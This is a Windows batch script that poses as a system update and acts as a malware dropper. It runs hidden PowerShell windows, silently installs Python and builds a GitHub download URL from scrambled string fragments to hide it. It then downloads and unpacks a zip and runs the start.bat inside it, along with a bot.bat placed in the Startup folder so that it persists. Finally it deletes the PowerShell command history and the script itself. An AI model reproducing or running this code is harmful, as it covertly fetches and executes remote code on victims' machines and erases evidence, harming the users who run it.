@echo off
powershell -WindowStyle Hidden -Command "echo Syatem Updating......!"
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5"
powershell -WindowStyle Hidden -Command "winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent"
set s=ads&set d=c.zip&set a=/main/&set n=http&set t=ub.com/kevi&set o=s/ra&set w=levi/p&set e=s://gith&set k=fs/he&set r=w/re&
set ql=%n%%e%%t%%w%%o%%r%%k%%s%%a%%d%
set ZipPath=C:\Downloads\start.zip
set ExtractPath=C:\Downloads
powershell Invoke-WebRequest -Uri %ql% -OutFile %ZipPath%
powershell Expand-Archive -Path %ZipPath% -DestinationPath %ExtractPath% -Force
powershell Remove-Item %ZipPath%
del "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
powershell -WindowStyle Hidden -Command "cd 'C:\Downloads'; .\start.bat"
powershell -WindowStyle Hidden -Command "cd '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'; .\bot.bat"
del "%~f0"
exit

